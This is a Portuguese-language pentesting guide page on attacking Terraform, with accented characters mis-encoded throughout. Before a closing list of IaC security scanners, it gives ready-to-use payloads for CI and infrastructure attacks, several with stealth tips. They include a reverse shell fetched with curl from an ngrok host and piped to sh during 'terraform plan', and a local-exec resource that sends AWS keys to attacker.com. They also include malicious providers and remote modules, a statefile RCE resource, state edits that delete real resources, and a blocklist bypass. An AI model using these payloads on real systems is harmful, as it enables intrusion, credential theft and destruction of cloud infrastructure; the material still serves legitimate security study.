# Seguran√ßa do Terraform

{{#include ../banners/hacktricks-training.md}}

## Informa√ß√µes B√°sicas

[Dos docs:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform √© uma **ferramenta de infraestrutura como c√≥digo** que permite definir tanto **recursos em nuvem quanto locais** em arquivos de configura√ß√£o leg√≠veis por humanos que voc√™ pode versionar, reutilizar e compartilhar. Voc√™ pode ent√£o usar um fluxo de trabalho consistente para provisionar e gerenciar toda a sua infraestrutura ao longo de seu ciclo de vida. O Terraform pode gerenciar componentes de baixo n√≠vel, como computa√ß√£o, armazenamento e recursos de rede, bem como componentes de alto n√≠vel, como entradas DNS e recursos SaaS.

#### Como o Terraform funciona?

O Terraform cria e gerencia recursos em plataformas de nuvem e outros servi√ßos por meio de suas interfaces de programa√ß√£o de aplicativos (APIs). Os provedores permitem que o Terraform funcione com praticamente qualquer plataforma ou servi√ßo com uma API acess√≠vel.

![](<../images/image (177).png>)

A HashiCorp e a comunidade Terraform j√° escreveram **mais de 1700 provedores** para gerenciar milhares de tipos diferentes de recursos e servi√ßos, e esse n√∫mero continua a crescer. Voc√™ pode encontrar todos os provedores dispon√≠veis publicamente no [Terraform Registry](https://registry.terraform.io/), incluindo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog e muitos mais.

O fluxo de trabalho central do Terraform consiste em tr√™s etapas:

- **Escrever:** Voc√™ define recursos, que podem estar em v√°rios provedores de nuvem e servi√ßos. Por exemplo, voc√™ pode criar uma configura√ß√£o para implantar um aplicativo em m√°quinas virtuais em uma rede de Nuvem Privada Virtual (VPC) com grupos de seguran√ßa e um balanceador de carga.
- **Planejar:** O Terraform cria um plano de execu√ß√£o descrevendo a infraestrutura que criar√°, atualizar√° ou destruir√° com base na infraestrutura existente e em sua configura√ß√£o.
- **Aplicar:** Ap√≥s a aprova√ß√£o, o Terraform executa as opera√ß√µes propostas na ordem correta, respeitando quaisquer depend√™ncias de recursos. Por exemplo, se voc√™ atualizar as propriedades de uma VPC e mudar o n√∫mero de m√°quinas virtuais nessa VPC, o Terraform recriar√° a VPC antes de escalar as m√°quinas virtuais.

![](<../images/image (215).png>)

### Laborat√≥rio Terraform

Basta instalar o terraform no seu computador.

Aqui voc√™ tem um [guia](https://learn.hashicorp.com/tutorials/terraform/install-cli) e aqui voc√™ tem a [melhor maneira de baixar o terraform](https://www.terraform.io/downloads).

## RCE no Terraform: envenenamento de arquivo de configura√ß√£o

O Terraform **n√£o tem uma plataforma que exponha uma p√°gina da web ou um servi√ßo de rede** que possamos enumerar, portanto, a √∫nica maneira de comprometer o terraform √© **ser capaz de adicionar/modificar arquivos de configura√ß√£o do terraform** ou **ser capaz de modificar o arquivo de estado do terraform** (veja o cap√≠tulo abaixo).

No entanto, o terraform √© um **componente muito sens√≠vel** a comprometer porque ter√° **acesso privilegiado** a diferentes locais para que possa funcionar corretamente.

A principal maneira de um atacante conseguir comprometer o sistema onde o terraform est√° sendo executado √© **comprometer o reposit√≥rio que armazena as configura√ß√µes do terraform**, porque em algum momento elas ser√£o **interpretadas**.

Na verdade, existem solu√ß√µes que **executam terraform plan/apply automaticamente ap√≥s a cria√ß√£o de um PR**, como **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

Se voc√™ conseguir comprometer um arquivo terraform, existem diferentes maneiras de realizar RCE quando algu√©m executa `terraform plan` ou `terraform apply`.

### Terraform plan

O terraform plan √© o **comando mais utilizado** no terraform e desenvolvedores/solu√ß√µes que usam terraform o chamam o tempo todo, ent√£o a **maneira mais f√°cil de obter RCE** √© garantir que voc√™ envenene um arquivo de configura√ß√£o do terraform que executar√° comandos arbitr√°rios em um `terraform plan`.

**Usando um provedor externo**

O Terraform oferece o [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) que fornece uma maneira de interagir entre o Terraform e programas externos. Voc√™ pode usar a fonte de dados `external` para executar c√≥digo arbitr√°rio durante um `plan`.

Injetar em um arquivo de configura√ß√£o do terraform algo como o seguinte executar√° um rev shell ao executar `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Usando um provedor personalizado**

Um atacante poderia enviar um [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) para o [Terraform Registry](https://registry.terraform.io/) e ent√£o adicion√°-lo ao c√≥digo Terraform em um branch de recurso ([exemplo daqui](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
O provedor √© baixado no `init` e executar√° o c√≥digo malicioso quando `plan` for executado.

Voc√™ pode encontrar um exemplo em [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Usando uma refer√™ncia externa**

Ambas as op√ß√µes mencionadas s√£o √∫teis, mas n√£o muito discretas (a segunda √© mais discreta, mas mais complexa do que a primeira). Voc√™ pode realizar este ataque de uma **maneira mais discreta**, seguindo estas sugest√µes:

- Em vez de adicionar o rev shell diretamente no arquivo terraform, voc√™ pode **carregar um recurso externo** que cont√©m o rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Voc√™ pode encontrar o c√≥digo rev shell em [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- No recurso externo, use o recurso **ref** para ocultar o **c√≥digo rev shell do terraform em um branch** dentro do reposit√≥rio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

O Terraform apply ser√° executado para aplicar todas as mudan√ßas, voc√™ tamb√©m pode abusar disso para obter RCE injetando **um arquivo Terraform malicioso com** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Voc√™ s√≥ precisa garantir que algum payload como os seguintes termine no arquivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Siga as **sugest√µes da t√©cnica anterior** para realizar este ataque de uma **maneira mais furtiva usando refer√™ncias externas**.

## Dumps de Segredos

Voc√™ pode ter **valores secretos usados pelo terraform despejados** executando `terraform apply` ao adicionar ao arquivo terraform algo como:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Abusando de Arquivos de Estado do Terraform

Caso voc√™ tenha acesso de escrita sobre os arquivos de estado do terraform, mas n√£o possa alterar o c√≥digo do terraform, [**esta pesquisa**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) oferece algumas op√ß√µes interessantes para aproveitar o arquivo. Mesmo que voc√™ tenha acesso de escrita sobre os arquivos de configura√ß√£o, usar o vetor de arquivos de estado √© muitas vezes muito mais sorrateiro, j√° que voc√™ n√£o deixa rastros no hist√≥rico do `git`.

### RCE no Terraform: envenenamento de arquivo de configura√ß√£o

√â poss√≠vel [criar um provedor personalizado](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) e simplesmente substituir um dos provedores no arquivo de estado do terraform pelo malicioso ou adicionar um recurso falso referenciando o provedor malicioso.

O provedor [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) se baseia na pesquisa e arma esse princ√≠pio. Voc√™ pode adicionar um recurso falso e declarar o comando bash arbitr√°rio que deseja executar no atributo `command`. Quando a execu√ß√£o do `terraform` √© acionada, isso ser√° lido e executado tanto nos passos `terraform plan` quanto `terraform apply`. No caso do passo `terraform apply`, o `terraform` ir√° deletar o recurso falso do arquivo de estado ap√≥s executar seu comando, limpando ap√≥s si mesmo. Mais informa√ß√µes e uma demonstra√ß√£o completa podem ser encontradas no [reposit√≥rio do GitHub que hospeda o c√≥digo-fonte para este provedor](https://github.com/offensive-actions/terraform-provider-statefile-rce).

Para us√°-lo diretamente, basta incluir o seguinte em qualquer posi√ß√£o do array `resources` e personalizar os atributos `name` e `command`:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Ent√£o, assim que `terraform` for executado, seu c√≥digo ser√° executado.

### Deletando recursos <a href="#deleting-resources" id="deleting-resources"></a>

Existem 2 maneiras de destruir recursos:

1. **Inserir um recurso com um nome aleat√≥rio no arquivo de estado apontando para o recurso real a ser destru√≠do**

Porque o terraform ver√° que o recurso n√£o deveria existir, ele o destruir√° (seguindo o ID do recurso real indicado). Exemplo da p√°gina anterior:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modifique o recurso para deletar de uma maneira que n√£o seja poss√≠vel atualizar (para que ele seja deletado e recriado)**

Para uma inst√¢ncia EC2, modificar o tipo da inst√¢ncia √© suficiente para fazer o terraform deletar e recri√°-la.

### Substituir provedor na lista negra

Caso voc√™ encontre uma situa√ß√£o onde `hashicorp/external` foi colocado na lista negra, voc√™ pode reimplementar o provedor `external` fazendo o seguinte. Nota: Usamos um fork do provedor external publicado por https://registry.terraform.io/providers/nazarewk/external/latest. Voc√™ tamb√©m pode publicar seu pr√≥prio fork ou reimplementa√ß√£o.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Ent√£o voc√™ pode usar `external` como de costume.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Ferramentas de Auditoria Autom√°tica

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk oferece uma solu√ß√£o abrangente de escaneamento de Infrastructure as Code (IaC) que detecta vulnerabilidades e configura√ß√µes incorretas em Terraform, CloudFormation, Kubernetes e outros formatos de IaC.

- **Recursos:**
- Escaneamento em tempo real para vulnerabilidades de seguran√ßa e problemas de conformidade.
- Integra√ß√£o com sistemas de controle de vers√£o (GitHub, GitLab, Bitbucket).
- Pull requests autom√°ticas de corre√ß√£o.
- Conselhos detalhados de remedia√ß√£o.
- **Inscreva-se:** Crie uma conta em [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** √© uma ferramenta de an√°lise de c√≥digo est√°tico para infraestrutura como c√≥digo (IaC) e tamb√©m uma ferramenta de an√°lise de composi√ß√£o de software (SCA) para imagens e pacotes de c√≥digo aberto.

Ele escaneia a infraestrutura em nuvem provisionada usando [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md) ou [OpenTofu](https://opentofu.org/) e detecta configura√ß√µes incorretas de seguran√ßa e conformidade usando escaneamento baseado em grafo.

Ele realiza [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md), que √© uma varredura de pacotes de c√≥digo aberto e imagens para Vulnerabilidades e Exposi√ß√µes Comuns (CVEs).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

Do [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` √© um framework de teste leve, focado em seguran√ßa e conformidade, contra terraform para habilitar a capacidade de teste negativo para sua infraestrutura como c√≥digo.

- **conformidade:** Garantir que o c√≥digo implementado esteja seguindo padr√µes de seguran√ßa, seus pr√≥prios padr√µes personalizados
- **desenvolvimento orientado a comportamento:** Temos BDD para quase tudo, por que n√£o para IaC?
- **port√°til:** basta instal√°-lo via `pip` ou execut√°-lo atrav√©s do `docker`. Veja [Instala√ß√£o](https://terraform-compliance.com/pages/installation/)
- **pr√©-implanta√ß√£o:** valida seu c√≥digo antes de ser implantado
- **f√°cil de integrar:** pode ser executado em seu pipeline (ou em ganchos do git) para garantir que todas as implanta√ß√µes sejam validadas.
- **segrega√ß√£o de deveres:** voc√™ pode manter seus testes em um reposit√≥rio diferente onde uma equipe separada √© respons√°vel.

> [!NOTE]
> Infelizmente, se o c√≥digo estiver usando alguns provedores aos quais voc√™ n√£o tem acesso, voc√™ n√£o poder√° realizar o `terraform plan` e executar esta ferramenta.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

Do [**docs**](https://github.com/aquasecurity/tfsec): tfsec usa an√°lise est√°tica do seu c√≥digo terraform para identificar poss√≠veis configura√ß√µes incorretas.

- ‚òÅÔ∏è Verifica configura√ß√µes incorretas em todos os principais (e alguns menores) provedores de nuvem
- ‚õî Centenas de regras integradas
- ü™Ü Escaneia m√≥dulos (locais e remotos)
- ‚ûï Avalia express√µes HCL, bem como valores literais
- ‚Ü™Ô∏è Avalia fun√ß√µes Terraform, por exemplo, `concat()`
- üîó Avalia relacionamentos entre recursos Terraform
- üß∞ Compat√≠vel com o Terraform CDK
- üôÖ Aplica (e embeleza) pol√≠ticas Rego definidas pelo usu√°rio
- üìÉ Suporta m√∫ltiplos formatos de sa√≠da: lovely (padr√£o), JSON, SARIF, CSV, CheckStyle, JUnit, texto, Gif.
- üõ†Ô∏è Configur√°vel (via flags de CLI e/ou arquivo de configura√ß√£o)
- ‚ö° Muito r√°pido, capaz de escanear rapidamente grandes reposit√≥rios
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Encontre vulnerabilidades de seguran√ßa, problemas de conformidade e configura√ß√µes incorretas de infraestrutura no in√≠cio do ciclo de desenvolvimento da sua infraestrutura como c√≥digo com **KICS** da Checkmarx.

**KICS** significa **K**eeping **I**nfrastructure as **C**ode **S**ecure, √© de c√≥digo aberto e √© indispens√°vel para qualquer projeto nativo da nuvem.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

Do [**docs**](https://github.com/tenable/terrascan): Terrascan √© um analisador de c√≥digo est√°tico para Infraestrutura como C√≥digo. Terrascan permite que voc√™:

- Escaneie perfeitamente a infraestrutura como c√≥digo em busca de configura√ß√µes incorretas.
- Monitore a infraestrutura em nuvem provisionada para altera√ß√µes de configura√ß√£o que introduzem desvios de postura e permite reverter para uma postura segura.
- Detecte vulnerabilidades de seguran√ßa e viola√ß√µes de conformidade.
- Mitigue riscos antes de provisionar infraestrutura nativa em nuvem.
- Oferece flexibilidade para rodar localmente ou integrar com seu CI\CD.
```bash
brew install terrascan
```
## Refer√™ncias

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)

{{#include ../banners/hacktricks-training.md}}
